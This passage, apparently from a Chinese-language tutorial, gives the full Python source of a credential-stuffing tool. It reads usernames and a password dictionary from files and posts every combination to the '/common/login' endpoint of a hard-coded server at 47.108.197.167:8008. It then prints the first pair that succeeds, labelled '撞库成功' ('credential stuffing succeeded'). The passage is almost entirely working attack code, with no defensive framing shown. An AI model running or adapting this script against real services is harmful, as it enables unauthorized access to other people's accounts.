def readFileToList(path):  
    with open(path,"r",encoding="utf-8") as f:  
        return f.readlines()
```

# main主程序

```
  
from util.requestWeb import requestWeb  # 导入两个文件的库方法
from util.openfile import readFileToList  
import requests  
  
  
def main():  
  
    userList = readFileToList("./user.txt")  
    passList = readFileToList("./dict.txt")  
  
  
    success = False  
    url = "http://47.108.197.167:8008"  
    web = requestWeb(url=url)  
  
    with requests.session() as session:  
        for i in userList:  
            if  success:  
                break  
            for j in passList:  
                  
                i = i.replace("\n","")  
                j = j.replace("\n","")  
                b = web.login(session= session,username=i,password=j)  
                if b :  
                    success = True  
                    break  
           
  
  
if __name__ == "__main__":  
    main()
```

# requests请求文件

```
import requests  
import json  
  
  
class requestWeb:     #定义的类
  
    def __init__(self,url):  
        self.url = url  
        pass  
  
# 这是我们的post请求函数  
    def sendPost(self,session,webUrl,payload,head):  
          
        re = None  
        if payload and head:  
            re = session.post(webUrl,json=payload,headers=head)  
        elif payload:  
            re = session.post(webUrl,json=payload)  
        elif head:  
            re = session.post(webUrl,headers=head)  
        else:  
            re = session.post(webUrl)  
  
        return re   
  
  
  
    def login(self,username,password,session):  
  
        webUrl = self.url + "/common/login"     
        payload = {"name":username,"password":password}  
        re = self.sendPost(session=session,payload= payload,head=None,webUrl=webUrl)      
        if re.status_code != 200:  
            print("请求直接失败，服务器都没有访问成功")  
            return False  
  
        data = json.loads(re.text)      
        if data["code"] != 200:  
            print(data["msg"])  
            print("账户是：" + username + "   密码：" + password)  
            return False  
  
        print("撞库成功")  
        print("账户：" + username + "    密码：" + password)      
        return True
